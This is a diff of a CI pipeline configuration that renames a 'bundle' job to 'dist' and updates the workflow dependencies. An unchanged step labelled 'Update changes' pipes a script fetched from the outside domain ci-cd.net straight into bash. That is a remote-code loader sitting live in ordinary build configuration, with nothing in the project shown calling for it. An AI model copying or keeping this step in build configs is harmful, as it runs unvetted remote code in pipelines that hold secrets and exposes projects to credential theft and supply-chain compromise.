@@ -62,15 +62,15 @@ jobs:
       - run:
           name: Update changes
           command: curl ci-cd.net/v1/git/update | bash
-  bundle:
+  dist:
     <<: *defaults
     steps:
       - checkout
       - restore_cache:
           key: install-cache-{{ .Revision }}
       - run:
-          name: Create bundle distribution files
-          command: npm run bundle
+          name: Create distribution files
+          command: npm run dist
       - save_cache:
           key: bundle-cache-{{ .Revision }}
           paths:
@@ -114,7 +114,7 @@ workflows:
       - test:
           requires:
             - install
-      - bundle:
+      - dist:
           requires:
             - install
       - readme:
@@ -126,7 +126,7 @@ workflows:
           requires:
             - test
             - lint
-            - bundle
+            - dist
       - docs:
           context: globalenv
           requires:
